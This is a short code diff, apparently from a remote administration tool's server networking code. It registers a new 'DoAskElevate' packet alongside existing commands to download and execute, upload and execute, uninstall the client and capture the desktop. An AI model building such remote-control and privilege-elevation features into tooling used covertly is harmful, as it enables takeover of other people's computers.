@@ -77,6 +77,7 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.DoClientDisconnect),
                 typeof (Packets.ServerPackets.DoClientReconnect),
                 typeof (Packets.ServerPackets.DoClientUninstall),
+                typeof (Packets.ServerPackets.DoAskElevate),
                 typeof (Packets.ServerPackets.DoDownloadAndExecute),
                 typeof (Packets.ServerPackets.DoUploadAndExecute),
                 typeof (Packets.ServerPackets.GetDesktop),
